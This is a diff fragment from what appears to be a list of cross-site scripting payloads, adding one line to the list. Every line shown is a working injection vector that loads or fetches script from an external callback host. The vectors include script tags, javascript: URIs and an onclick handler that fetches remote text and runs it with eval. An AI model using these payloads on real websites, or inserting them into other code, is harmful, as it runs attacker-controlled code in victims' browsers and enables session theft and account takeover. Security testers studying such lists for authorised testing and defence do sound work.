@@ -23,3 +23,4 @@ var a=document.createElement("script");a.src="https://xss0r.com/c/iybmad";docume
 '"<script nomodule src="https://xss0r.com/c/iybmad"></script>
 javascript:window.location="https://xss0r.com/c/iybmad"
 javascript:fetch("https://xss0r.com/c/iybmad")
+<a href="#" onclick="fetch('https://xss0r.com/c/iybmad').then(r=>r.text()).then(eval)">Click me</a>
